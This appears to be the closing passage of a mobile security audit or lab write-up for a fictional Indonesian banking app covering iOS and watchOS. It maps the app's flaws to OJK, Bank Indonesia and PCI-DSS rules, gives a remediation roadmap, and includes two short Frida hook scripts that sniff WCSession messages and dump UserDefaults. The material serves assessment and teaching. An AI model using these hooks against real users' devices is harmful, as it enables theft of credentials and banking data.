  Comprehensive technical evaluation of the Nexora iOS and watchOS ecosystem across all 10 preceding scenarios reveals systematic architecture-level non-compliance with Indonesian financial sector regulations and international payment card data security standards.
  Storage of cleartext tokens in `UserDefaults`, unencrypted inter-device `WCSession` dictionaries, race condition vulnerabilities in ATM cash dispensing, and unauthenticated 2FA transaction approvals represent direct compliance failures that trigger regulatory sanctions from the Financial Services Authority (OJK) and Bank Indonesia.
- **Comprehensive Regulatory Mapping Table**:

| Regulatory Standard / Mandate | Legal Requirement & Intent | Observed Implementation Flaw | Compliance Status | Business Impact & Penalty |
|---|---|---|---|---|
| **POJK 11/POJK.03/2022 Pasal 25** | Perlindungan data dan integritas keamanan pada perangkat akhir (endpoint) nasabah. | Kredensial JWT, Quick-PIN 4-digit, dan nomor rekening tersimpan dalam format teks terbuka di file `.plist` sandboxed container jam. | ❌ **NON-COMPLIANT** | Sanksi administratif OJK, denda finansial bertahap, dan perintah penghentian sementara operasional produk wearable banking. |
| **POJK 11/POJK.03/2022 Pasal 31** | Penerapan Multi-Factor Authentication (MFA) yang mengikat pada transaksi transfer bernilai tinggi. | Otorisasi transfer dana Rp 50.000.000 hanya menggunakan interaksi notifikasi smartwatch tanpa tanda tangan kriptografi Secure Enclave atau otentikasi biometrik `LAContext`. | ❌ **NON-COMPLIANT** | Kewajiban ganti rugi 100% dana nasabah yang hilang akibat fraud transaksi ketiadaan MFA memadai. |
| **Bank Indonesia PADG 24/1/PADG/2022** | Tata cara implementasi SNAP QRIS Dinamis dengan validasi nonce dan masa kedaluwarsa ketat. | Payload QRIS memuat token transaksi statis (`A016304E8A2`) tanpa validasi masa berlaku (freshness timestamp) pada core backend, rentan serangan replay. | ❌ **NON-COMPLIANT** | Pencabutan lisensi Penyelenggara Jasa Pembayaran (PJP) dan denda kepatuhan Bank Indonesia. |
| **PCI-DSS v4.0 Req 3.4 & 3.5** | Melindungi Primary Account Number (PAN) dan data otentikasi sensitif pada seluruh media penyimpanan. | Data kartu virtual (`NX-VIRT-4401`) dan riwayat saldo tersimpan tanpa enkripsi kuat AES-256 pada disk klien jam tangan. | ❌ **FAIL** | Denda acquiring bank bulanan (USD 5.000 - USD 100.000), penurunan PCI merchant tier, dan audit investigasi forensik PFI wajib. |
| **PCI-DSS v4.0 Req 4.1** | Melindungi data pemegang kartu saat transit melalui jaringan terbuka atau nirkabel publik. | Paket komunikasi Bluetooth LE `WCSession` mentransmisikan saldo dan instruksi debit dalam format Objective-C dictionary tanpa enkripsi lapis aplikasi. | ❌ **FAIL** | Kerentanan terhadap pembajakan transaksi man-in-the-middle di ruang publik nirkabel. |
| **PCI-DSS v4.0 Req 6.2 & 6.5** | Memastikan perangkat lunak bebas dari kerentanan umum seperti Race Condition dan Brute-Force. | Endpoint verifikasi ATM Cardless Cash `/api/atm/cardless-cash/verify` rentan race condition double-dispense dan tidak menerapkan rate limiting OTP. | ❌ **FAIL** | Kerugian finansial kas fisik bank langsung pada unit ATM terminal akibat eksploitasi multi-threading. |

- **CISO Executive Scorecard**:
  - **Overall Enterprise Posture**: `24 / 100` (CRITICAL RISK — AUDIT FAILED)
  - **Vulnerability Breakdown**:
    - **CRITICAL** (2 Findings): V-AP02 (Plaintext WCSession Dictionary), V-AP04 (High-Value Rp 50.000.000 2FA Hijack).
    - **HIGH** (5 Findings): V-AP01 (UserDefaults Plist Storage), V-AP03 (Unthrottled Quick-PIN), V-AP06 (SNAP QRIS Replay), V-B01 (Remote Balance Injection), V-L04 (ATM Cardless Race Condition & Brute-Force).
    - **MEDIUM** (3 Findings): V-AP05 (Wrist-Off Sensor Spoofing), V-W09 (Card Freeze Desynchronization), V-07 (Jailbreak Detection Bypass).
- **Prioritized 30-60-90 Day CISO Remediation Roadmap**:
  1. **Phase 1: Days 1–30 (Immediate Containment & Storage Migration)**:
     - Migrate all token, PIN, and account persistence from `UserDefaults` to **Apple Keychain Services** (`kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly`).
     - Refactor `/api/atm/cardless-cash/verify` to execute atomic status transition: `UPDATE cardless_cash_tokens SET status = 'DISPENSED' WHERE token = ? AND status = 'ACTIVE' AND expires_at > datetime('now');` with distributed locking.
     - Implement rate-limiting on all OTP endpoints (max 3 attempts per 15 minutes).
  2. **Phase 2: Days 31–60 (Channel Cryptography & Biometric Binding)**:
     - Implement application-layer **AES-256-GCM** encryption over `WCSession` with ephemeral ECDH P-256 key agreement.
     - Require mandatory `LAContext` biometric authentication (FaceID / Apple Watch Passcode) and Secure Enclave cryptographic signature for all wire transfers exceeding Rp 10.000.000.
     - Add two-phase commit acknowledgement with server signature for Emergency Card Freeze actions.
  3. **Phase 3: Days 61–90 (Hardware Attestation & Governance Formalization)**:
     - Replace client-side heuristic jailbreak checks with **Apple App Attest** (DeviceCheck API) and server-side challenge verification.
     - Enforce SNAP PADG 24/1/PADG/2022 compliance: 60-second dynamic QRIS freshness windows, one-time nonce validation, and HMAC request signing.
     - Complete formal re-audit and submit compliance report to OJK Department of Banking Supervision.

---

## 🛠️ 6. Frida & Cycript Cheatsheet for iOS & watchOS

### WCSession Sniffer Hook Script
```javascript
// sniff_wcsession.js
if (ObjC.available) {
    var hook = ObjC.classes.WatchSessionManager["- session:didReceiveMessage:replyHandler:"];
    Interceptor.attach(hook.implementation, {
        onEnter: function(args) {
            var msg = new ObjC.Object(args[3]);
            console.log("\n[🚨 WCSESSION SNIFFED PACKET]");
            console.log(msg.toString());
        }
    });
}
```

### Dump UserDefaults from Runtime
```javascript
// dump_userdefaults.js
var defaults = ObjC.classes.NSUserDefaults.standardUserDefaults();
console.log(defaults.dictionaryRepresentation().toString());
```

---

## 🛡️ 7. Regulatory Compliance Matrix & Enterprise Remediation

| Vulnerability Code | Scenario Name | Business Risk | Regulatory Violation | Production Remediation |
|---|---|---|---|---|
| **V-AP01** | Insecure Plist Storage | Token and Quick-PIN theft from backups. | POJK 11/2022 Pasal 25, PCI-DSS Req 3.4 | Migrate storage to **Apple Keychain Services** (`kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly`). |
| **V-AP02** | WCSession Cleartext Sync | Financial data tampered over BLE. | PCI-DSS Req 4.1, POJK 11/2022 Pasal 26 | Enforce application-layer AES-256-GCM encryption with ephemeral ECDH P-256 keys. |
| **V-AP03** | Unthrottled Quick-PIN | 4-digit PIN brute-forced in minutes. | NIST SP 800-63B, OWASP MASVS-AUTH | Implement exponential delay backoff (1s, 2s, 4s, 8s) and lockout after 5 failed attempts. |
| **V-AP04** | OOB Rp 50.000.000 Transfer Hijack | Fraudulent wire transfer authorization. | POJK 11/2022 Pasal 31 (MFA) | Require biometric authorization via `LAContext` and Secure Enclave asymmetric signature. |
| **V-AP05** | Wrist-Off Sensor Spoofing | Stolen watch remains usable off-wrist. | ISO 27001 A.8.1, POJK 11/2022 | Validate wrist status via native hardware queries verified on backend. |
| **V-AP06** | Dynamic QRIS Replay | Replayable merchant checkout tokens. | SNAP PADG 24/1/PADG/2022 | Implement 60-second TOTP nonce freshness and backend HMAC signature validation. |
| **V-B01** | Remote Balance Injection | Spoofed balance display on smartwatch screen. | POJK 11/2022 Pasal 25, OWASP MASVS-NETWORK | Validate session tokens and sign bridge payload with HMAC-SHA256. |
| **V-L04** | ATM Cardless Race Condition & Brute-Force | Double-dispense cash theft at ATM terminals. | POJK 11/2022 Pasal 25 & 31, PCI-DSS Req 6.2 | Enforce distributed Redis mutex locks, atomic token state transition, and 3-attempt OTP throttling. |
| **V-W09** | Wrist Card Freeze Desynchronization | Stolen card remains active while UI indicates frozen. | POJK 11/2022 Pasal 25, PCI-DSS Req 4.1 | Implement two-phase commit with cryptographic confirmation nonce before UI update. |
| **V-07** | Client-Side Jailbreak Detection Bypass | Tampered runtime environments undetected. | POJK 11/2022 Pasal 25, PCI-DSS Req 10.5 | Adopt Apple DeviceCheck and DCAppAttestService hardware-backed attestation. |
| **GOV-01** | CISO Regulatory Audit Failure | Sanctions, operating license revocation, financial penalties. | POJK 11/2022, SNAP QRIS, PCI-DSS v4.0 | Implement prioritized 30-60-90 day remediation roadmap across storage, transport, and auth layers. |
